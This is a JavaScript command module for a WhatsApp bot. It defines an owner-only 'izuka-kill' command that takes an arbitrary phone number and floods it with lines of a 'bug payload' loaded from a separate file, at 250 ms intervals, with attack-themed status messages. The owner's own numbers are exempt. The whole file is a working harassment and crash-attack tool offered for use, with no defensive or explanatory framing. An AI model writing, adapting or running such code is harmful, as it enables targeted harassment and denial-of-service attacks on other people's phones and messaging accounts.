const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../../bug/izuka3.js'); // Chanje isit la: inconnu3.js → izuka3.js

cmd({
  pattern: 'izuka-kill',
  desc: 'Owner only command to spam a target number with bug payload',
  category: 'bug',
  react: '🪲',
  filename: __filename
}, async (izuka, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'izuka-kill') return;

    const botNumber = await izuka.decodeJid(izuka.user.id);
    const senderId = m.sender;
    const allowed = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
    ];

    if (!allowed.includes(senderId)) {
      return await izuka.sendMessage(from, { text: '🚫 *THIS IS AN OWNER/SUDO ONLY COMMAND*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await izuka.sendMessage(from, { text: '❌ *Usage:* `.izuka-kill 13058962443xxxxxxxx`' }, { quoted: mek });
    }

    const safeNumbers = ['13058962443', config.OWNER_NUMBER, ...(config.SUDO || [])];
    if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
      return await izuka.sendMessage(from, { text: '⚠️ *You cannot target this protected number.*' }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const attackLines = bugchat.split('\n').filter(Boolean);

    await izuka.sendMessage(from, {
      text: `🧠 *IZUKA-KILL ACTIVATED*\n\n👾 Targeting: *+${targetNumber}*\n🔋 Intensity: *MAXIMUM*\n\n⏳ *Launching Payload...*`,
    }, { quoted: mek });

    for (let i = 0; i < attackLines.length; i++) {
      await izuka.sendMessage(targetJid, {
        text: `💥 *IZUKA-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _IZUKA ATTACK ENGINE_`,
      });
      await new Promise(r => setTimeout(r, 250));
    }

    await izuka.sendMessage(from, {
      text: `✅ *ATTACK COMPLETED*\n\n💥 *IZUKA-KILL successfully delivered to* +${targetNumber}\n🔚 *Operation Finished.*`,
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
